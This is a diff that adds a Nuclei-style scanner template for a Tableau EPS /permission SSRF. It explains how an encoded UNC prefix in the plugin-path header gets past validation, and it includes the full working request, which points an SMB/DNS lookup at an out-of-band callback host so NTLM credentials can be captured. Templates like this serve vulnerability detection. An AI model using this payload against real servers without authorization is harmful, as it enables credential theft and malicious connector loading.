@@ -1,0 +1,46 @@
+id: tableau-eps-ssrf
+
+info:
+  name: Tableau EPS /permission UNC Path Bypass to SSRF
+  author: jtc-security
+  severity: critical
+  description: |
+    The /permission route uses getOptionalTacoPathHeader which performs zero UNC
+    validation, unlike getRequiredTacoPathHeader used by /launch. A URL-encoded
+    /\ prefix in the plugin-path header bypasses the string prefix check and
+    triggers outbound SMB/DNS resolution, enabling NTLM credential capture or
+    malicious connector loading.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-26496
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-52452
+  tags: tableau,ssrf,unc,eps,permission
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vizql/sessions/ABC-1:0/eps/main/permission"
+      - "{{BaseURL}}/vizql/sessions/ABC-1:1/eps/main/permission"
+      - "{{BaseURL}}/vizql/sessions/ABC-1:2/eps/main/permission"
+      - "{{BaseURL}}/vizql/sessions/ABC-1:3/eps/main/permission"
+      - "{{BaseURL}}/vizql/sessions/ABC-1:4/eps/main/permission"
+      - "{{BaseURL}}/vizql/sessions/ABC-1:5/eps/main/permission"
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+      caller-id: "synack1"
+      plugin-path: "%2F%5C{{interactsh-url}}%2Fshare%2Fconnectors%2Ftest.taco"
+    body: '{"connectorClass":"test_connector","connectionId":"test-connection-1"}'
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "smb"
